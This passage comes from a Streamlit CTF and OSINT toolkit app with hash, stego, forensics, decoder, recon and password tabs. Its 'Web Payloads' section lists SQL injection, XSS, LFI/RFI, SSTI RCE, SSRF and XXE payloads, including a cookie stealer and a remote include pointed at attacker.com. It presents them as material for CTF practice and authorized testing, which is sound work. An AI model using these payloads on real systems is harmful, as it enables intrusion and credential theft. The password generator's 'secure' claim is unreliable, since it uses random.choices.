                    result += ch
            ok(f"**Result:** {result}")

    # ── HASH IDENTIFIER ────────────────────────────────────────────────
    elif tool == "#️⃣ Hash Identifier & Cracker":
        st.markdown("""
A hash is a one-way fingerprint — you can't reverse it mathematically, but you can look it up in a database of billions of known hashes to find the original.

**Identify yours by length:**
- 32 characters → MD5
- 40 characters → SHA-1
- 64 characters → SHA-256
- 128 characters → SHA-512
- Starts with `$2y$` or `$2b$` → bcrypt (very slow to crack)

Paste it below — I'll tell you the type, give you the hashcat command, and link you to CrackStation to try it in-browser.
        """)
        hash_in = st.text_input("Paste the hash:", placeholder="5f4dcc3b5aa765d61d8327deb882cf99", key="h_in")
        if st.button("Identify", use_container_width=True) and hash_in:
            h = hash_in.strip()
            L = len(h)
            hex_pat = re.fullmatch(r'[a-fA-F0-9]+', h)
            if L == 32 and hex_pat:
                ok("**MD5** — 32 hex characters")
                st.code("hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            elif L == 40 and hex_pat:
                ok("**SHA-1** — 40 hex characters")
                st.code("hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            elif L == 64 and hex_pat:
                ok("**SHA-256** — 64 hex characters")
                st.code("hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            elif L == 128 and hex_pat:
                ok("**SHA-512** — 128 hex characters")
                st.code("hashcat -m 1700 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            elif re.match(r'^\$2[aby]\$', h):
                ok("**bcrypt** — very slow to crack")
                st.code("hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            else:
                warn(f"Unknown hash type (length: {L}). Check hash-identifier or try manually.")
            st.link_button("Try CrackStation (free, huge database)", "https://crackstation.net/", use_container_width=True)

    # ── STEGANOGRAPHY ───────────────────────────────────────────────────
    elif tool == "🖼️ Steganography":
        st.markdown("""
Steganography = hiding secret data inside a file (usually an image). The file looks totally normal but there's something hidden in it.

**How to approach it:**
1. Upload the image here — I'll show a preview and extract any readable strings from it right now
2. If nothing obvious shows up, use the terminal commands below
3. Aperisolve runs most stego tools automatically if you prefer a web UI

**Signs something is hidden:**
- File size is way too big for its dimensions
- The challenge gave you a password hint
- The image has oddly solid areas or weird color banding
        """)
        steg_f = st.file_uploader("Upload the image", type=["jpg","png","bmp","gif","tiff"], key="steg_f")
        if steg_f:
            steg_bytes = steg_f.getvalue()
            st.image(io.BytesIO(steg_bytes), width=300)
            # Extract strings in-browser
            found_str = re.findall(rb"[\x20-\x7E]{4,}", steg_bytes)
            interesting = [s.decode("ascii","ignore") for s in found_str
                           if any(k in s.decode("ascii","ignore").lower() for k in ["flag","ctf","key","secret","pass","hidden"])]
            if interesting:
                ok(f"Found {len(interesting)} interesting string(s) in the file:")
                for s in interesting[:20]:
                    st.code(s)
            else:
                st.info("No obvious flag-like strings found in the raw bytes. Try the tools below.")

        st.link_button("🌐 Aperisolve — runs all stego tools online", "https://aperisolve.com", use_container_width=True)
        st.markdown("**Terminal commands (Kali Linux):**")
        st.code("""# Check the real file type (don't trust the extension)
file image.png

# Look for strings containing "flag"
strings image.png | grep -iE 'flag|ctf|key|secret'

# Check for embedded files
binwalk -e image.png

# Try steghide (JPG — try empty password first)
steghide extract -sf image.jpg -p ""

# PNG hidden data
zsteg -a image.png

# Check EXIF
exiftool image.png""", language="bash")

    # ── WEB PAYLOADS ────────────────────────────────────────────────────
    elif tool == "💉 Web Payloads":
        st.markdown("""
Ready-to-use payloads for web CTF challenges. Pick a category, copy, paste, and try.

Only use these on machines you own or have explicit permission to test.
        """)
        warn("CTF and authorized testing only.")
        wcat = st.radio("Category:", ["SQL Injection", "XSS", "LFI/RFI", "SSTI", "SSRF", "XXE"], horizontal=True, key="wcat")
        payloads = {
            "SQL Injection": """-- Basic login bypass
' OR '1'='1' --
admin'--

-- Find number of columns (keep going until error)
' ORDER BY 1--
' ORDER BY 2--

-- Extract data (MySQL)
' UNION SELECT NULL,username,password FROM users--

-- Blind: check if vulnerable
' AND 1=1--   (true, page loads normally)
' AND 1=2--   (false, page changes)

-- Time-based blind
' AND SLEEP(5)--""",
            "XSS": """<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Cookie stealer -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

<!-- Filter bypasses -->
<ScRiPt>alert(1)</ScRiPt>
javascript:alert(1)""",
            "LFI/RFI": """../../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd

# Read PHP source via filter
php://filter/convert.base64-encode/resource=index.php

# Remote include (if enabled)
?page=http://attacker.com/shell.txt""",
            "SSTI": """# Test: does the server evaluate math?
{{7*7}}   → should show 49 if vulnerable

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}""",
            "SSRF": """# Internal admin panels
http://127.0.0.1:8080/admin
http://localhost:22

# AWS metadata endpoint
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IP bypass (127.0.0.1 as decimal)
http://2130706433/""",
            "XXE": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Blind XXE -->
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;""",
        }
        st.code(payloads[wcat])

    # ── FORENSICS ───────────────────────────────────────────────────────
    elif tool == "🔬 Forensics & PCAP":
        st.markdown("""
Forensics challenges give you a file to dig through — network captures (`.pcap`), disk images, or memory dumps. You're looking for hidden files, deleted data, or suspicious traffic.

Pick what you have and I'll give you the exact commands to run.
        """)
        ftool = st.radio("What are you working with?", ["PCAP (network capture)", "Disk image", "Memory dump"], horizontal=True, key="ftool")
        if ftool == "PCAP (network capture)":
            st.code("""# Open in Wireshark (GUI)
wireshark capture.pcap

# See all HTTP requests in terminal
tshark -r capture.pcap -Y "http.request"

# Follow a TCP conversation
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# Export HTTP files (images, downloads, etc.)
tshark -r capture.pcap --export-objects http,./output/

# Search for the flag directly
strings capture.pcap | grep -iE 'CTF\\{|flag\\{'""", language="bash")
        elif ftool == "Disk image":
            st.code("""# Carve all recoverable files
foremost -i disk.img -o output/

# Find embedded files and extract them
binwalk -e disk.img

# Mount the image to browse files (Linux)
mkdir /mnt/disk
mount -o loop disk.img /mnt/disk
ls /mnt/disk

# Search all files for the flag
grep -r 'CTF{' /mnt/disk 2>/dev/null""", language="bash")
        elif ftool == "Memory dump":
            st.code("""# List running processes
python3 vol.py -f memory.dump windows.pslist

# See what commands were run
python3 vol.py -f memory.dump windows.cmdline

# Dump a suspicious process (replace 1234 with the PID)
python3 vol.py -f memory.dump windows.dumpfiles --pid 1234

# Extract password hashes
python3 vol.py -f memory.dump windows.hashdump

# Scan for strings
strings memory.dump | grep -iE 'CTF\\{|flag\\{'""", language="bash")

    # ── NUMBER BASE CONVERTER ───────────────────────────────────────────
    elif tool == "🔢 Number Base Converter":
        st.markdown("""
Type a number or text and I'll convert it to/from decimal, hex, binary, and ASCII. Useful when a CTF gives you a weird-looking number and you need to figure out what it actually means.
        """)
        num_in = st.text_input("Enter a number or text:", placeholder="72  or  48656c6c6f  or  Hello", key="num_in")
        if num_in and num_in.strip():
            v = num_in.strip()
            try:
                if re.fullmatch(r'[0-9a-fA-F]+', v) and not v.isdigit():
                    n = int(v, 16)
                    st.markdown(f"**Treating `{v}` as hex:**")
                    st.markdown(f"- Decimal: `{n}`")
                    st.markdown(f"- Binary: `{bin(n)}`")
                    if len(v) % 2 == 0:
                        st.markdown(f"- ASCII: `{bytes.fromhex(v).decode('utf-8', 'replace')}`")
                elif v.isdigit():
                    n = int(v)
                    st.markdown(f"**Decimal `{n}`:**")
                    st.markdown(f"- Hex: `{hex(n)}`")
                    st.markdown(f"- Binary: `{bin(n)}`")
                    st.markdown(f"- Octal: `{oct(n)}`")
                    st.markdown(f"- ASCII char: `{chr(n) if 32 <= n <= 126 else '(not printable)'}`")
                else:
                    hexed = v.encode().hex()
                    st.markdown(f"**Text `{v}`:**")
                    st.markdown(f"- Hex: `{hexed}`")
                    st.markdown(f"- Decimal bytes: `{' '.join(str(b) for b in v.encode())}`")
                    st.markdown(f"- Binary: `{' '.join(format(b,'08b') for b in v.encode())}`")
            except Exception as e:
                danger(f"Conversion error: {e}")

    # ── XOR DECODER ────────────────────────────────────────────────────
    elif tool == "🔐 XOR Decoder":
        st.markdown("""
XOR is super common in CTFs — each byte of the message gets XOR'd with a key. If you know the key, done. If not, I can brute-force all 256 single-byte possibilities and show you the ones that look like readable text.

Paste the ciphertext as hex. Leave the key blank to brute-force it.
        """)
        xor_hex = st.text_input("Hex-encoded ciphertext:", placeholder="1a2b3c4d5e...", key="xor_hex")
        xor_key = st.text_input("XOR key (text or hex, leave blank to brute force):", key="xor_key")
        if st.button("Decode", use_container_width=True) and xor_hex:
            try:
                raw = bytes.fromhex(re.sub(r'[^0-9a-fA-F]', '', xor_hex))
                if xor_key:
                    kb = xor_key.encode() if not re.fullmatch(r'[0-9a-fA-F]+', xor_key) else bytes.fromhex(xor_key)
                    result = bytes([raw[i] ^ kb[i % len(kb)] for i in range(len(raw))])
                    ok(f"Result: `{result.decode('utf-8','replace')}`")
                else:
                    st.markdown("**Brute forcing single-byte XOR (showing printable results only):**")
                    for k in range(256):
                        candidate = bytes([b ^ k for b in raw])
                        if sum(32 <= c <= 126 for c in candidate) > len(raw) * 0.8:
                            ok(f"Key 0x{k:02x} ({k}): `{candidate.decode('ascii','replace')}`")
            except Exception as e:
                danger(f"Error: {e}. Make sure the input is valid hex.")

    # ── MORSE CODE ─────────────────────────────────────────────────────
    elif tool == "📡 Morse Code Decoder":
        st.markdown("""
Dots and dashes. Letters are separated by a single space, words by three spaces (or ` / `).

`.... . .-.. .-.. ---   .-- --- .-. .-.. -..` = `HELLO WORLD`

Works both ways — decode Morse to text, or encode text to Morse.
        """)
        MORSE = {
            '.-':'A','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I',
            '.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q',
            '.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y',
            '--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3','....-':'4',
            '.....':'5','-....':'6','--...':'7','---..':'8','----.':'9',
            '.-.-.-':'.','--..--':',','..--..':'?','.----.':'\'','-.-.--':'!',
            '-..-.':'/','.--.-.':'@','...-..-':'$',
            '-...':'B',
        }
        morse_in = st.text_area("Morse code:", height=80, placeholder=".... . .-.. .-.. ---   .-- --- .-. .-.. -..", key="morse_in")
        c1, c2 = st.columns(2)
        with c1:
            if st.button("Decode Morse → Text", use_container_width=True) and morse_in:
                words = morse_in.strip().split('   ')
                try:
                    decoded = ' '.join(
                        ''.join(MORSE.get(sym.strip(), '?') for sym in word.split())
                        for word in words
                    )
                    ok(f"**Decoded:** {decoded}")
                except Exception as e:
                    danger(f"Error: {e}")
        with c2:
            encode_text = st.text_input("Or encode text → Morse:", placeholder="HELLO", key="morse_enc")
            if encode_text:
                REV_MORSE = {v: k for k, v in MORSE.items()}
                encoded = '   '.join(
                    ' '.join(REV_MORSE.get(ch.upper(), '?') for ch in word)
                    for word in encode_text.split()
                )
                ok(f"**Morse:** {encoded}")

    # ── JWT DECODER ────────────────────────────────────────────────────
    elif tool == "🔑 JWT Decoder":
        st.markdown("""
JWT = JSON Web Token. It's three Base64 chunks separated by dots: `header.payload.signature`

The payload is where the interesting stuff is — user IDs, expiry, roles, and sometimes flags. Paste the full token and I'll decode the header and payload for you. I'll flag it if something looks like a CTF flag.
        """)
        jwt_in = st.text_area("JWT token:", height=80, placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxx", key="jwt_in")
        if st.button("Decode JWT", use_container_width=True) and jwt_in:
            parts = jwt_in.strip().split('.')
            if len(parts) != 3:
                danger("Not a valid JWT — should have exactly 2 dots separating 3 parts.")
            else:
                import json as _json
                for i, (label, part) in enumerate(zip(["Header", "Payload"], parts[:2])):
                    try:
                        pad = part + "=" * ((4 - len(part) % 4) % 4)
                        decoded = base64.urlsafe_b64decode(pad).decode("utf-8", errors="replace")
                        parsed = _json.loads(decoded)
                        st.markdown(f"**{label}:**")
                        st.json(parsed)
                        # Flag detection
                        flat = _json.dumps(parsed).lower()
                        if any(x in flat for x in ['flag{', 'ctf{', 'flag']):
                            ok(f"⚑ Possible flag found in {label}!")
                    except Exception as e:
                        danger(f"Couldn't decode {label}: {e}")
                warn("Signature is NOT verified here — this only reads the data inside.")

    # ── URL ENCODER / DECODER ──────────────────────────────────────────
    elif tool == "🌐 URL Encoder / Decoder":
        st.markdown("""
URL encoding swaps special characters for `%XX` codes. You'll see this in web CTF challenges where URLs have stuff like `%3D`, `%2F`, or `%27` in them.

Paste whatever you have and I'll show you both the encoded and decoded version side by side.
        """)
        url_in = st.text_area("Text to encode or decode:", height=80, placeholder="hello world  or  hello%20world", key="url_in")
        if url_in:
            c1, c2 = st.columns(2)
            with c1:
                encoded = urllib.parse.quote(url_in.strip(), safe='')
                st.markdown("**URL Encoded:**")
                st.code(encoded)
            with c2:
                decoded = urllib.parse.unquote(url_in.strip())
                st.markdown("**URL Decoded:**")
                st.code(decoded)
            # Double-encoded detection
            if '%25' in url_in:
                warn("Looks double-encoded (has `%25`). Click URL Decoded twice to fully decode.")

    # ── BASE32 ────────────────────────────────────────────────────────
    elif tool == "📦 Base32 Decoder":
        st.markdown("""
Base32 is like Base64 but only uses A-Z and 2-7. All uppercase, usually ends with `=` signs.

`JBSWY3DPEBLW64TMMQ======` → `Hello, World!`

Shows up in CTFs, OTP/2FA seeds, and Tor `.onion` addresses.
        """)
        b32_in = st.text_area("Base32 text:", height=80, placeholder="JBSWY3DPEBLW64TMMQ======", key="b32_in")
        c1, c2 = st.columns(2)
        with c1:
            if st.button("Decode Base32", use_container_width=True) and b32_in:
                try:
                    pad = b32_in.strip().upper()
                    pad += "=" * ((8 - len(pad) % 8) % 8)
                    result = base64.b32decode(pad).decode("utf-8", errors="replace")
                    ok(f"**Decoded:** {result}")
                except Exception as e:
                    danger(f"Not valid Base32: {e}")
        with c2:
            b32_enc = st.text_input("Or encode text → Base32:", placeholder="Hello, World!", key="b32_enc")
            if b32_enc:
                ok(f"**Base32:** {base64.b32encode(b32_enc.encode()).decode()}")


# ── TAB 6: DEEP FILE SCAN ───────────────────────────────────────────────
with tab6:
    sec("Deep File Scan")
    st.markdown("""
Upload any file — image, PDF, zip, binary, whatever — and I'll tear it apart:

- **SHA256 hash** — useful for verifying a file hasn't been tampered with
- **Entropy score** — high entropy (near 8.0) means the file is encrypted or packed. Low entropy (~3-4) means plain text
- **Readable strings** — pulls out every readable string from the raw bytes
- **Entropy heatmap** — visual breakdown showing which parts of the file are compressed/encrypted (red) vs normal (blue)

This is how malware analysts start looking at suspicious files.
    """)
    tip("Encrypted sections show up bright red on the heatmap. If a file claims to be a plain document but the heatmap is mostly red, something's off.")

    deep_f = st.file_uploader("Choose a file", key="deep_f")
    if deep_f:
        fb = deep_f.getvalue()
        fname = deep_f.name
        md5h = hashlib.md5(fb).hexdigest()
        sha256h = hashlib.sha256(fb).hexdigest()
        glass(f"<b>{fname}</b><br>Size: {len(fb):,} bytes<br>MD5: <code>{md5h}</code><br>SHA256: <code>{sha256h}</code>")

        if len(fb) > 0:
            freq = Counter(fb)
            probs = [freq[b] / len(fb) for b in freq]
            entropy = -sum(p * math.log2(p) for p in probs if p > 0)
            st.metric("Shannon Entropy", f"{entropy:.2f} / 8.0",
                      help="7-8 = encrypted/compressed. 0-4 = plain text.")

            # Entropy heatmap — fixed column count
            n_blocks = min(64, len(fb))
            bsz = max(1, len(fb) // n_blocks)
            ents = []
            for i in range(0, len(fb), bsz):
                blk = fb[i:i+bsz]
                if blk:
                    fq = Counter(blk)
                    pv = [fq[b] / len(blk) for b in fq]
                    ents.append(-sum(p * math.log2(p) for p in pv if p > 0))
            n = min(64, len(ents))
            if n > 0:
                st.markdown("**Entropy heatmap** (blue = low / normal, red = encrypted/compressed):")
                cols = st.columns(n)
                for idx in range(n):
                    e = ents[idx]
                    color = f"hsl({int(240 - e * 30)}, 80%, 50%)"
                    cols[idx].markdown(
                        f"<div style='background:{color};height:24px;border-radius:4px;' title='{e:.2f}'></div>",
                        unsafe_allow_html=True)

        strings_found = re.findall(rb"[\x20-\x7E]{4,}", fb)
        if strings_found:
            unique_strings = list(dict.fromkeys(s.decode("ascii", "ignore") for s in strings_found))
            with st.expander(f"🔤 Readable strings found ({len(unique_strings)}) — click to expand"):
                st.code("\n".join(unique_strings[:100]))
            st.download_button("📥 Download all strings as .txt",
                               "\n".join(unique_strings[:500]),
                               file_name=f"{fname}_strings.txt")


# ── TAB 7: NETWORK RECON ────────────────────────────────────────────────
with tab7:
    sec("Network Recon")
    st.markdown("""
Enter an IP or domain and I'll run everything I can against it right here:

- **DNS records** — see what IPs, mail servers, and nameservers are behind a domain
- **IP geolocation** — country, city, ISP, coordinates
- **Common subdomain probe** — checks ~20 common subdomains (admin, mail, vpn, dev, etc.) to see what's exposed
- **Threat intel links** — VirusTotal, Shodan, AbuseIPDB one-click

**What's DNS?** It maps domain names to IPs. `google.com` → `142.250.80.46`. The records tell you a lot about how a company's infrastructure is set up.
    """)
    tip("Try `8.8.8.8` (Google DNS) or `example.com` to see what comes back. For pentesting, start with the domain before the IP.")

    net_t = st.text_input("IP address or domain", placeholder="8.8.8.8  or  example.com", key="net_t")
    if st.button("Run Recon", use_container_width=True, key="net_go") and net_t:
        tgt = net_t.strip().lower()
        is_ip = bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', tgt))
        glass(f"<b>Target:</b> {tgt}")

        if HAS_DNS and not is_ip:
            sec("DNS Records")
            tip("A = IPv4, MX = mail server, TXT = SPF/DKIM/verification records, NS = nameservers")
            found_dns = False
            for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT']:
                try:
                    answers = dns.resolver.resolve(tgt, rtype, lifetime=4)
                    for ans in answers:
                        rcard(f"<code>{rtype}</code> &nbsp; {str(ans)[:150]}")
                        found_dns = True
                except: pass
            if not found_dns:
                st.info("No DNS records found. Double-check the domain.")

            sec("🔍 Common Subdomain Probe")
            tip("Checking ~20 common subdomains. Green = resolved to an IP (might be live). This is not a port scan.")
            COMMON_SUBS = ["www","mail","remote","blog","webmail","server","ns1","ns2","smtp","secure",
                           "vpn","api","dev","admin","portal","test","mx","ftp","ssh","app"]
            sub_results = []
            spb = st.progress(0.0)
            for i, sub in enumerate(COMMON_SUBS):
                try:
                    ans = dns.resolver.resolve(f"{sub}.{tgt}", 'A', lifetime=2)
                    ips = [str(r) for r in ans]
                    sub_results.append((f"{sub}.{tgt}", ips))
                except: pass
                spb.progress((i+1)/len(COMMON_SUBS))
            spb.empty()
            if sub_results:
                ok(f"Found {len(sub_results)} live subdomains:")
                for name, ips in sub_results:
                    rcard(f"<b>{name}</b> → {', '.join(ips)}")
            else:
                st.info("No common subdomains resolved. Try a full scan with Amass or Subfinder.")

        if is_ip:
            sec("IP Geolocation")
            try:
                geo = requests.get(
                    f"http://ip-api.com/json/{tgt}?fields=status,country,city,isp,org,lat,lon",
                    timeout=5).json()
                if geo.get('status') == 'success':
                    glass(f"<b>Country:</b> {geo.get('country','?')}<br>"
                          f"<b>City:</b> {geo.get('city','?')}<br>"
                          f"<b>ISP:</b> {geo.get('isp','?')}<br>"
                          f"<b>Org:</b> {geo.get('org','?')}<br>"
                          f"<b>Coordinates:</b> {geo.get('lat','?')}, {geo.get('lon','?')}")
            except:
                st.info("Couldn't fetch geolocation right now.")

        sec("Threat Intelligence")
        c1, c2, c3 = st.columns(3)
        kind = 'ip-address' if is_ip else 'domain'
        c1.link_button("VirusTotal", f"https://www.virustotal.com/gui/{kind}/{tgt}", use_container_width=True)
        c2.link_button("Shodan", f"https://www.shodan.io/search?query={tgt}", use_container_width=True)
        c3.link_button("AbuseIPDB", f"https://www.abuseipdb.com/check/{tgt}", use_container_width=True)


# ── TAB 8: PASSWORDS ────────────────────────────────────────────────────
with tab8:
    sec("Password Tools")
    st.markdown("""
Three things here — pick what you need:

- **Check a password** — honest scoring, no fluff, tells you exactly what's weak about it
- **Generate passwords** — actually random, actually secure, copy and use them
- **Hash text** — generate MD5/SHA1/SHA256/SHA512 hashes right here (great for CTFs)
    """)

    pw_mode = st.radio("What do you need?", ["Check a password", "Generate passwords", "Hash something"], horizontal=True)

    if pw_mode == "Check a password":
        tip("Your password never leaves your browser — this check runs entirely on the server with no logging.")
        pw_in = st.text_input("Password to check:", type="password", placeholder="type your password here", key="pw_in")
        if st.button("Check it", key="pw_check") and pw_in:
            p = pw_in
            score = 0
            notes = []
            if len(p) >= 16: score += 3
            elif len(p) >= 12: score += 2
            elif len(p) >= 8: score += 1
            else: notes.append("Too short — use at least 12 characters")
            if re.search(r"[a-z]", p): score += 1
            else: notes.append("Add lowercase letters")
            if re.search(r"[A-Z]", p): score += 1
            else: notes.append("Add uppercase letters")
            if re.search(r"\d", p): score += 1
            else: notes.append("Add numbers")
            if re.search(r"[^a-zA-Z0-9]", p): score += 2
            else: notes.append("Add symbols like !@#$%")
            if score >= 8: ok("Strong password.")
            elif score >= 5: warn("Decent password, but could be stronger.")
            else: danger("Weak password — easy to crack.")
            pills([("Length", len(p)), ("Score", f"{score}/9")])
            for n in notes:
                st.markdown(f"- {n}")

    elif pw_mode == "Generate passwords":
        tip("These are generated randomly each time. Passwords are never stored.")
        col1, col2 = st.columns(2)
        with col1: pw_len = st.slider("Length", 8, 64, 20)
        with col2: pw_count = st.slider("How many", 1, 10, 5)
        include_symbols = st.checkbox("Include symbols (!@#$%)", value=True)
        if st.button("Generate", use_container_width=True):
            chars = string.ascii_letters + string.digits
            if include_symbols: chars += "!@#$%^&*-_=+"
            for _ in range(pw_count):
                st.code(''.join(random.choices(chars, k=pw_len)))

    elif pw_mode == "Hash something":
        st.markdown("""
**Hashing** converts any text into a fixed-length string. Same input always gives the same output.
Used to store passwords safely (though MD5 and SHA1 are outdated for that purpose now).

Useful in CTFs when you need to generate a hash to compare with a target.
        """)
        text = st.text_input("Text to hash:", placeholder="hello world", key="hash_text")
        if text:
            st.code(f"MD5:     {hashlib.md5(text.encode()).hexdigest()}")
            st.code(f"SHA-1:   {hashlib.sha1(text.encode()).hexdigest()}")
            st.code(f"SHA-256: {hashlib.sha256(text.encode()).hexdigest()}")
            st.code(f"SHA-512: {hashlib.sha512(text.encode()).hexdigest()}")


st.markdown(
    "<div style='text-align:center;color:#1e3040;font-size:.7rem;padding:1.2rem 0 .4rem;letter-spacing:1px'>"
    "🔬 OSINT Suite &nbsp;·&nbsp; open source intelligence &nbsp;·&nbsp; built for researchers, students & CTF players &nbsp;·&nbsp; 2026"
    "</div>",
    unsafe_allow_html=True)
